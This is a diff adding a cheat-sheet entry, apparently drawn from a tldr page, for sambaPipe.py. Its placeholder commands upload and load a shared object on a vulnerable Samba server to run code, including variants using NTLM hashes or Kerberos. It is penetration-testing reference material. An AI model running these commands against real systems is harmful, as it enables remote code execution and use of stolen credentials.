@@ -1,0 +1,19 @@
+; This has been extracted from
+; https://github.com/tldr-pages/tldr/blob/master/pages/common/sambapipe.py.md
+
+% sambapipe.py, common
+
+# Upload and load a shared object file on a vulnerable Samba server
+sambaPipe.py -so <path_to_file_so> <domain>/<username>:<password>@<target>
+
+# Authenticate using NTLM hashes instead of a password
+sambaPipe.py -so <path_to_file_so> -hashes <LM_HASH_NT_HASH> <domain>/<username>:<password>@<target>
+
+# Use Kerberos authentication for the target
+sambaPipe.py -so <path_to_file_so> -k -no-pass <domain>/<username>:<password>@<target>
+
+# Specify a domain controller IP for authentication
+sambaPipe.py -so <path_to_file_so> -dc-ip <dc_ip> <domain>/<username>:<password>@<target>
+
+# Use a custom port for the SMB connection
+sambaPipe.py -so <path_to_file_so> -port <port> <domain>/<username>:<password>@<target>
